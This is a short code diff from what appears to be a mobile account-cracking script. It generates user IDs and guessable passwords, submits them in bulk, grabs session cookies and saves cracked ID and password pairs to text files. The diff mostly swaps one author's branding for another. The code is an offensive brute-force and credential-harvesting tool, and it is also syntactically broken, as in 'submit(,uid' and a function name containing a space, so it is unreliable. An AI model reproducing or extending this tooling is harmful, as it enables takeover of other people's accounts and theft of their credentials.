@@ -162,7 +162,7 @@ def fuck():
         for love in user:
             uid = code+name+cod+love
             pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
-            asha.submit(Nehal Khan,uid,pwx,tl)
+            asha.submit(,uid,pwx,tl)
     print('-------------------')
     print(' [✓] Crack process has been completed')
     print(' [✓] OK Ids saved as AHAD ISLAM-OK.txt')
@@ -219,7 +219,7 @@ def Nehal Khan(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
                 print(f"[AHAD ISLAM-CP] {cid}|{ps}")
-                open('/sdcard/Nehal Khan-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                open('/sdcard/AHAD ISLAM-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
